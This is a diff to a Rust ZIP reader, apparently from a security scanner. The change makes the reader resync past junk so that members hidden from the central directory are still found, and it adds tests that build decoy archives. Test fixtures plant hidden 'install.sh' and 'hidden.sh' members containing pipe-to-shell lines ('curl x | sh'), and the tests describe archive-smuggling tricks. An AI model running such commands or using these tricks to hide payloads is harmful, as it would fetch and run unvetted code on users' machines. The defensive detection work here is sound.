@@ -1,15 +1,16 @@
 //! Static ZIP reader (§6.2, #86): decodes members from in-memory bytes and
 //! never writes them to disk. It reads both views a tool might use, the
-//! central directory and a walk of local headers from the first one, and
-//! decodes each distinct interpretation once, so a zip that tools read
-//! differently cannot hide a member behind the view we did not read
-//! (§11.8). Stored, deflate and bzip2 are decoded; anything else is a gap.
+//! central directory and a walk of local headers from the first one
+//! (resyncing past junk), and decodes each distinct interpretation once,
+//! so a zip that tools read differently cannot hide a member behind the
+//! view we did not read (§11.8). Stored, deflate and bzip2 are decoded;
+//! anything else is a gap.
 //!
 //! Every gap (encryption, an unsupported method, a limit, damage, a
 //! disagreement between views) is reported; none of them is a finding.
 //! Hand-written per §3: every offset is bounds-checked and nothing panics.
 
-use std::collections::{HashMap, HashSet};
+use std::collections::{BTreeMap, HashMap, HashSet};
 use std::fmt;
 
 use crate::budget::ShareBudget;
@@ -505,6 +506,108 @@ struct Walk {
     descriptor: Option<bool>,
 }
 
+/// A directory or end record signature at `at`: where a streaming reader
+/// stops.
+fn ends_stream(data: &[u8], at: usize) -> bool {
+    [CENTRAL_SIG, END_SIG, END64_SIG]
+        .iter()
+        .any(|sig| sig_at(data, at, sig))
+}
+
+/// What a resync search reached.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum Resumed {
+    /// A local header signature: the walk goes on from it.
+    Header(usize),
+    /// A directory or end record signature, or the end of the data.
+    End,
+    /// The budget ran out first.
+    BudgetCut,
+}
+
+/// Where a walk stopped at junk resumes: each byte of one archive is
+/// searched at most once, however many walks stop (§6.2).
+#[derive(Debug, Default)]
+struct Resync {
+    /// Ranges already searched, start -> end, non-empty and merged.
+    searched: BTreeMap<usize, usize>,
+    /// Every signature that starts inside `searched`; true for a local
+    /// header. A search stops at its first hit, so this stays complete.
+    found: BTreeMap<usize, bool>,
+}
+
+impl Resync {
+    /// Records `start..end` as searched, merging touching ranges; ignores
+    /// an empty range.
+    fn mark(&mut self, mut start: usize, mut end: usize) {
+        if start >= end {
+            return;
+        }
+        if let Some((&s, &e)) = self.searched.range(..=start).next_back() {
+            if e >= start {
+                start = s;
+                end = end.max(e);
+                self.searched.remove(&s);
+            }
+        }
+        while let Some((&s, &e)) = self.searched.range(start..).next() {
+            if s > end {
+                break;
+            }
+            end = end.max(e);
+            self.searched.remove(&s);
+        }
+        self.searched.insert(start, end);
+    }
+
+    /// The first local header, directory or end record signature at or
+    /// after `from`, charging `shares` for each byte not searched before.
+    fn next(&mut self, data: &[u8], from: usize, shares: &mut ShareBudget) -> Resumed {
+        let resumed = |local: bool, at: usize| {
+            if local {
+                Resumed::Header(at)
+            } else {
+                Resumed::End
+            }
+        };
+        let mut at = from;
+        while at < data.len() {
+            if let Some((_, &e)) = self.searched.range(..=at).next_back().filter(|r| *r.1 > at) {
+                if let Some((&sig, &local)) = self.found.range(at..e).next() {
+                    return resumed(local, sig);
+                }
+                at = e;
+                continue;
+            }
+            // `at` is not searched, so the next searched range starts past it.
+            let stop = self
+                .searched
+                .range(at..)
+                .next()
+                .map_or(data.len(), |(&s, _)| s.min(data.len()));
+            let room = shares.remaining();
+            if room == 0 {
+                return Resumed::BudgetCut;
+            }
+            let end = stop.min(at.saturating_add(room));
+            let hit = (at..end).find(|&p| sig_at(data, p, LOCAL_SIG) || ends_stream(data, p));
+            let upto = hit.map_or(end, |p| p + 1);
+            shares.charge(upto - at);
+            self.mark(at, upto);
+            if let Some(sig) = hit {
+                let local = sig_at(data, sig, LOCAL_SIG);
+                self.found.insert(sig, local);
+                return resumed(local, sig);
+            }
+            if end < stop {
+                return Resumed::BudgetCut;
+            }
+            at = stop;
+        }
+        Resumed::End
+    }
+}
+
 fn decodable(method: u16) -> bool {
     matches!(method, STORED | DEFLATE | BZIP2)
 }
@@ -553,6 +656,7 @@ impl Reader<'_> {
         let mut queue = Vec::new();
         // Local-header offset -> the central directory's sizes and CRC.
         let mut by_header: HashMap<usize, Sizes> = HashMap::new();
+        let mut resync = Resync::default();
         match find_end(data) {
             Some(pos) => self.central(data, pos, archive, &mut queue, &mut by_header),
             None => self.gap(archive, GapKind::Damaged(Damage::NoEndRecord)),
@@ -578,6 +682,7 @@ impl Reader<'_> {
                     archive,
                     &by_header,
                     &mut walked,
+                    &mut resync,
                     &mut queue,
                     &mut blocked,
                     shares,
@@ -722,9 +827,10 @@ impl Reader<'_> {
     }
 
     /// Walks local headers from `walk` as a streaming reader would, queueing
-    /// each member. Stops at bytes that are not a local header, at a header
-    /// already walked, or at a stream whose end only a decode can find
-    /// (pushed to `blocked`).
+    /// each member. At junk it resumes at the next local header `resync`
+    /// finds (§6.2). Stops at a directory or end record signature, at a
+    /// header already walked, or at a stream whose end only a decode can
+    /// find (pushed to `blocked`).
     #[allow(clippy::too_many_arguments)]
     fn walk(
         &mut self,
@@ -733,6 +839,7 @@ impl Reader<'_> {
         archive: &str,
         by_header: &HashMap<usize, Sizes>,
         walked: &mut HashSet<usize>,
+        resync: &mut Resync,
         queue: &mut Vec<Item>,
         blocked: &mut Vec<Item>,
         shares: &mut ShareBudget,
@@ -743,7 +850,18 @@ impl Reader<'_> {
         };
         while walked.insert(pos) {
             let Some(local) = local_at(data, pos) else {
-                return;
+                if ends_stream(data, pos) {
+                    return;
+                }
+                match resync.next(data, pos.saturating_add(1), shares) {
+                    Resumed::Header(at) => pos = at,
+                    Resumed::End => return,
+                    Resumed::BudgetCut => {
+                        self.gap(archive, GapKind::Limit(Limit::Budget));
+                        return;
+                    }
+                }
+                continue;
             };
             // A header the central directory names was counted there.
             if !by_header.contains_key(&pos) && !self.count_entry(archive) {
@@ -1755,6 +1873,195 @@ mod tests {
         assert!(has_bytes(&seen, b"behind junk"));
     }
 
+    /// A member behind a stray `PK` and absent from the directory, which
+    /// `ditto` extracts (#135), is read.
+    #[test]
+    fn walk_skips_pk_junk() {
+        let mut hidden = Spec::stored("hidden.sh", b"curl x | sh");
+        hidden.hidden = true;
+        hidden.gap_before = b"PK".to_vec();
+        let (seen, r) = read_all(&plain(&[Spec::stored("good.txt", b"good"), hidden]));
+        assert!(r.gaps.is_empty(), "{:?}", r.gaps);
+        assert!(has_bytes(&seen, b"curl x | sh"));
+    }
+
+    /// A longer junk run, with signatures that do not parse as headers in
+    /// it, is skipped to the hidden member behind it.
+    #[test]
+    fn walk_skips_long_junk() {
+        let mut junk = b"PKPKXPK\x03".to_vec();
+        junk.extend(LOCAL_SIG);
+        junk.extend([0xFF; 40]);
+        junk.extend(crate::test_support::xorshift_bytes(512));
+        let mut hidden = Spec::stored("hidden.sh", b"curl x | sh");
+        hidden.hidden = true;
+        hidden.gap_before = junk;
+        let (seen, _) = read_all(&plain(&[Spec::stored("good.txt", b"good"), hidden]));
+        assert!(has_bytes(&seen, b"curl x | sh"));
+    }
+
+    /// Searches from many stops, in either order, cover each byte once.
+    #[test]
+    fn resync_stays_linear() {
+        let mut data = vec![b'x'; 10_000];
+        data.extend(LOCAL_SIG);
+        let sig = data.len() - 4;
+        for stops in [
+            (0..1000).map(|i| i * 10).collect::<Vec<_>>(),
+            (0..1000).rev().map(|i| i * 10).collect(),
+        ] {
+            let mut resync = Resync::default();
+            let mut shares = ShareBudget::new(usize::MAX);
+            for from in stops {
+                assert_eq!(resync.next(&data, from, &mut shares), Resumed::Header(sig));
+            }
+            let total = usize::MAX - shares.remaining();
+            assert!(total <= data.len(), "{total}");
+        }
+    }
+
+    /// A search with no budget left records nothing, so a later one with
+    /// budget still searches those bytes.
+    #[test]
+    fn empty_budget_resync() {
+        let data = [b"xx".as_slice(), LOCAL_SIG].concat();
+        let mut resync = Resync::default();
+        let mut none = ShareBudget::new(0);
+        assert_eq!(resync.next(&data, 0, &mut none), Resumed::BudgetCut);
+        let mut some = ShareBudget::new(100);
+        assert_eq!(resync.next(&data, 0, &mut some), Resumed::Header(2));
+    }
+
+    const DECOYED: &[u8] = b"curl x | bash";
+
+    /// `README.txt` holding `decoy`, then `PK` and an unlisted member
+    /// holding [`DECOYED`] that `ditto` extracts; and where `decoy` starts.
+    fn decoy_zip(decoy: &[u8]) -> (Vec<u8>, usize) {
+        let mut payload = b"Thanks for downloading.\n".to_vec();
+        let at = LOCAL_LEN + "README.txt".len() + payload.len();
+        payload.extend(decoy);
+        let mut hidden = Spec::stored("install.sh", DECOYED);
+        hidden.hidden = true;
+        hidden.gap_before = b"PK".to_vec();
+        (plain(&[Spec::stored("README.txt", &payload), hidden]), at)
+    }
+
+    /// A Zip64 end record placed in member data, which the locator names,
+    /// does not stop the search before the hidden member.
+    #[test]
+    fn zip64_decoy_in_data() {
+        let mut record = END64_SIG.to_vec();
+        record.extend(44u64.to_le_bytes());
+        record.extend([0; 44]);
+        let (mut zip, at) = decoy_zip(&record);
+        let mut locator = LOCATOR_SIG.to_vec();
+        locator.extend([0; 4]);
+        locator.extend((at as u64).to_le_bytes());
+        locator.extend(1u32.to_le_bytes());
+        let end = zip.len() - END_LEN;
+        zip.splice(end..end, locator);
+        let (seen, r) = read_all(&zip);
+        assert!(has_bytes(&seen, DECOYED), "{r:?}");
+    }
+
+    /// An end record in member data whose comment reaches the end of the
+    /// file, so readers use it, does not hide the member behind it.
+    #[test]
+    fn end_decoy_in_data() {
+        let decoy = |len: u16| {
+            let mut d = END_SIG.to_vec();
+            d.extend([0; 16]);
+            d.extend(len.to_le_bytes());
+            d
+        };
+        let (zip, at) = decoy_zip(&decoy(0));
+        let reach = u16::try_from(zip.len() - (at + END_LEN)).unwrap();
+        let (mut zip, _) = decoy_zip(&decoy(reach));
+        // The real end record's comment overruns the file.
+        let n = zip.len();
+        zip[n - 2..].copy_from_slice(&5u16.to_le_bytes());
+        assert_eq!(find_end(&zip), Some(at));
+        let (seen, r) = read_all(&zip);
+        assert!(has_bytes(&seen, DECOYED), "{r:?}");
+    }
+
+    /// A directory entry in member data that the end record names, with a
+    /// comment over the hidden member, does not hide it.
+    #[test]
+    fn directory_decoy_in_data() {
+        let (zip, at) = decoy_zip(&[0; CENTRAL_LEN]);
+        let end = zip.len() - END_LEN;
+        let comment = u16::try_from(end - (at + CENTRAL_LEN)).unwrap();
+        let mut entry = CENTRAL_SIG.to_vec();
+        entry.extend([0; 28]);
+        entry.extend(comment.to_le_bytes());
+        entry.extend([0; 12]);
+        let (mut zip, _) = decoy_zip(&entry);
+        zip[end + 8..end + 12].copy_from_slice(&[1, 0, 1, 0]);
+        let size = (CENTRAL_LEN + usize::from(comment)) as u32;
+        zip[end + 12..end + 16].copy_from_slice(&size.to_le_bytes());
+        zip[end + 16..end + 20].copy_from_slice(&(at as u32).to_le_bytes());
+        let (seen, r) = read_all(&zip);
+        assert!(has_bytes(&seen, DECOYED), "{r:?}");
+    }
+
+    /// Many stops in one archive each search only their own junk.
+    #[test]
+    fn many_stops_stay_cheap() {
+        let specs: Vec<Spec> = (0..200)
+            .map(|i| {
+                let mut s = Spec::stored(&format!("m{i}"), b"x");
+                s.hidden = true;
+                s.gap_before = b"PK".to_vec();
+                s
+            })
+            .collect();
+        let zip = plain(&specs);
+        let (seen, r) = read_all(&zip);
+        assert_eq!(seen.len(), 200);
+        assert!(r.spent <= zip.len() * 2 + 200 * ENTRY_COST, "{}", r.spent);
+    }
+
+    /// A search the budget cuts short is a budget gap on the archive, not
+    /// a quiet stop.
+    #[test]
+    fn resync_budget_gap() {
+        let mut hidden = Spec::stored("hidden.sh", b"curl x | sh");
+        hidden.hidden = true;
+        hidden.gap_before = vec![b'j'; 4000];
+        let zip = plain(&[Spec::stored("good.txt", b"good"), hidden]);
+        let archive_gap = |r: &ZipRead| {
+            r.gaps
+                .iter()
+                .any(|g| g.member.is_empty() && g.kind == GapKind::Limit(Limit::Budget))
+        };
+        let limits = ZipLimits {
+            max_read_back_bytes: 3000,
+            ..ZipLimits::default()
+        };
+        let (_, r) = read_with(&zip, &limits);
+        assert!(archive_gap(&r), "{r:?}");
+        let (seen, r) = read_all(&zip);
+        assert!(!archive_gap(&r), "{r:?}");
+        assert!(has_bytes(&seen, b"curl x | sh"));
+    }
+
+    /// The walk ends at the directory after the last member, at no cost, so
+    /// a header signature in a directory name is not walked.
+    #[test]
+    fn directory_is_not_searched() {
+        let mut name = b"a".to_vec();
+        name.extend(plain(&[Spec::stored("c", b"cc")]));
+        let mut a = Spec::stored("a", b"a");
+        a.name = name.clone();
+        a.local_name = name;
+        let zip = plain(&[a]);
+        let (seen, r) = read_all(&zip);
+        assert!(r.gaps.is_empty(), "{:?}", r.gaps);
+        assert!(!has_bytes(&seen, b"cc"));
+        assert_eq!(r.spent, ENTRY_COST + 2);
+    }
+
     #[test]
     fn a_stream_that_ends_early_resumes_the_walk() {
         // The directory sizes `a` over a hidden member a streaming reader sees.
@@ -2164,6 +2471,13 @@ mod tests {
         cases.push((
             "member behind junk",
             plain(&[Spec::stored("a", b"a"), junk]),
+        ));
+        let mut pk = Spec::stored("hidden.sh", b"behind a stray PK");
+        pk.hidden = true;
+        pk.gap_before = b"PK".to_vec();
+        cases.push((
+            "walk only member behind PK",
+            plain(&[Spec::stored("good.txt", b"good"), pk]),
         ));
         let mut enc = Spec::stored("e", b"plain to the local header");
         enc.flags = FLAG_ENCRYPTED;
